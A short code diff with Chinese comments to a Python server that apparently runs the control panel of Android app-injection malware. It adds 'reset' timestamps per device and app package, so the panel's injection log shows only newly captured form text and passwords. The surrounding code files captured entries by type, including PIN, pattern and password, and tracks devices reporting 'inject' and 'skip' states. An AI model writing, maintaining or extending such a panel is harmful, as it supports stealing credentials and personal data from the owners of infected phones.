@@ -588,6 +588,19 @@ def h_inj_track_act(b, q, a):
     # 面板状态徽标读 inj_state 表：这里同步落库，避免"重注"后闪一下"已注入"
     #   reset  → 清成空（面板显示"等待中"，等设备真正回报 inject）
     #   inject → injected；skip → skipped
+    # 重注入：记下时间戳，面板只显示这之后的新内容（旧的表单/密码不再回显）
+    try:
+        _pkg0 = str(b.get('packageName') or b.get('package_name') or b.get('pkg') or '').strip()
+        if d and act == 'reset':
+            rs = S.setdefault('inj_reset', {}).setdefault(str(d), {})
+            if _pkg0:
+                rs[_pkg0] = int(time.time())
+            else:
+                rs['*'] = int(time.time())
+            save()
+    except Exception as e:
+        print('[inj] reset 时间戳写入失败: %s' % e, flush=True)
+
     try:
         _db = db()
         _pkg = str(b.get('packageName') or b.get('package_name') or b.get('pkg') or '').strip()
@@ -1460,6 +1473,11 @@ def h_inject_logs(b, q, a):
                 if _type_l in ('pin', 'pattern', 'password', 'system', 'mixed'):
                     continue
                 ts = r.get('ts') or 0
+                # 该包被"重注入"过：只显示 reset 之后的新内容
+                _rs = (S.get('inj_reset') or {}).get(str(d)) or {}
+                _cut = _rs.get(r.get('pkg') or '') or _rs.get('*') or 0
+                if _cut and ts and ts < _cut:
+                    continue
                 out.append({
                     'pkg': r.get('pkg') or '',
                     'text': r.get('text') or '',
